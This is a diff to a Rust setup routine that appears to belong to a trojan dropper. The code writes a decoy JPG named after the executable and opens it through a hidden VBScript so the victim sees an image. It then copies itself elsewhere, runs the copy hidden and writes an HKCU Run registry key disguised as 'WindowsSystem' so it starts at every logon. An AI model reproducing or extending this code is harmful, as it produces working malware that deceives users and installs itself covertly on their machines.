@@ -75,8 +75,6 @@ pub fn setup() -> Result<()> {
   use std::{
     env, fs,
     process::{exit, Command},
-    thread,
-    time::Duration,
   };
   let home_path = env::home_dir().unwrap().display().to_string();
   let current_path = std::env::current_exe().unwrap().display().to_string();
@@ -86,52 +84,50 @@ pub fn setup() -> Result<()> {
   let token: String = thread_rng().sample_iter(&Alphanumeric).take(32).collect();
 
   if current_path == target_path {
-    let conf = get_app_config()?;
-    let mut new_path = conf.original_path.clone().replace(".exe", "");
-
-    if !new_path.ends_with(".jpg") {
-      new_path.push_str(".jpg");
-    }
-
-    fs::write(&new_path, PLACEHOLDER_BUF)?;
-
-    // loop {
-    //   match fs::remove_file(&conf.original_path) {
-    //     Ok(_) => break,
-    //     Err(_) => {
-    //       thread::sleep(Duration::from_millis(10));
-    //       continue;
-    //     }
-    //   }
-    // }
-
     return Ok(());
   }
 
-  fs::copy(&current_path, &target_path)?;
+  // Copy image and open
+  {
+    let mut image_path = current_path.clone().replace(".exe", "");
+
+    if !image_path.ends_with(".jpg") {
+      image_path.push_str(".jpg");
+    }
+
+    fs::write(&image_path, PLACEHOLDER_BUF)?;
+    let vbs_content = format!(
+      r#"
+      Set oShell = CreateObject("Wscript.Shell")
+      oShell.Run "cmd /c {}", 0, false
+    "#,
+      image_path
+    );
+    fs::write(&vbs_path, &vbs_content)?;
+    Command::new("wscript").arg(&vbs_path).output()?;
+    fs::remove_file(&vbs_path)?;
+
+    fs::copy(&current_path, &target_path)?;
+  }
 
   // Run add and register as autorun
-  let vbs_content = format!(
-    r#"
-    Set oShell = CreateObject("Wscript.Shell")
-    oShell.Run "cmd /c {target_path}", 0, false
-    oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
-  "#,
-    target_path = target_path
-  );
-  fs::write(&vbs_path, &vbs_content)?;
-  Command::new("wscript").arg(&vbs_path).output()?;
-  fs::remove_file(&vbs_path)?;
-
-  // Create config file
-  let conf_content = format!(
-    r#"
-    original_path={};
-    token={};
+  {
+    let vbs_content = format!(
+      r#"
+      Set oShell = CreateObject("Wscript.Shell")
+      oShell.Run "cmd /c {target_path}", 0, false
+      oShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsSystem","{target_path}","REG_SZ"
     "#,
-    current_path, token,
-  );
-  fs::write(&conf_path, &conf_content)?;
+      target_path = target_path
+    );
+    fs::write(&vbs_path, &vbs_content)?;
+    Command::new("wscript").arg(&vbs_path).output()?;
+    fs::remove_file(&vbs_path)?;
+
+    // Create config file
+    let conf_content = format!("token={};", token);
+    fs::write(&conf_path, &conf_content)?;
+  }
 
   exit(0);
 }
